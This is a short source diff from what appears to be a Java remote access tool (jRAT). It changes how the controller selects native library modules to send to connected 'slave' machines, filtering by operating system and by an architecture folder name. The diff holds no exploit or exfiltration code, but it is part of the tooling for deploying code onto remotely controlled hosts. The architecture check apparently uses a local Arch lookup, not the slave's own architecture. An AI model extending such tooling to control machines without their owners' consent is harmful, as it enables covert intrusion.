@@ -3,6 +3,7 @@ package jrat.controller.modules;
 import jrat.api.ControllerModule;
 import jrat.common.Logger;
 import jrat.controller.AbstractSlave;
+import oslib.Arch;
 import oslib.OperatingSystem;
 
 import java.io.File;
@@ -67,22 +68,46 @@ public final class Module {
             int index = name.lastIndexOf(".");
             String extension = index == -1 ? "" : name.substring(name.lastIndexOf("."));
 
-            switch (extension) {
-                case ".dylib":
-                    if (slave.getOperatingSystem().getType() != OperatingSystem.MACOS) {
-                        continue;
+            boolean isNative = extension.equals(".dylib") || extension.equals(".dll") || extension.equals(".so");
+
+            if (isNative) {
+                boolean match = false;
+
+                // filter libraries by compatible os
+                switch (extension) {
+                    case ".dylib":
+                        if (slave.getOperatingSystem().getType() != OperatingSystem.MACOS) {
+                            continue;
+                        }
+                        break;
+                    case ".dll":
+                        if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
+                            continue;
+                        }
+                        break;
+                    case ".so":
+                        if (!slave.getOperatingSystem().isUnix()) {
+                            continue;
+                        }
+                        break;
+                }
+
+                outer:
+                // loop the library path name for architecture part
+                // assumes it is a folder like ../x86_64/..
+                for (String part : name.split("/")) {
+                    for (String search : Arch.getArch().getSearch()) {
+                        if (search.equals(part)) {
+                            match = true;
+                            break outer;
+                        }
                     }
-                    break;
-                case ".dll":
-                    if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
-                        continue;
-                    }
-                    break;
-                case ".so":
-                    if (!slave.getOperatingSystem().isUnix()) {
-                        continue;
-                    }
-                    break;
+                }
+
+                if (!match) {
+                    Logger.log("skipping incompatible " + name);
+                    continue;
+                }
             }
 
             byte[] data = resources.get(name);
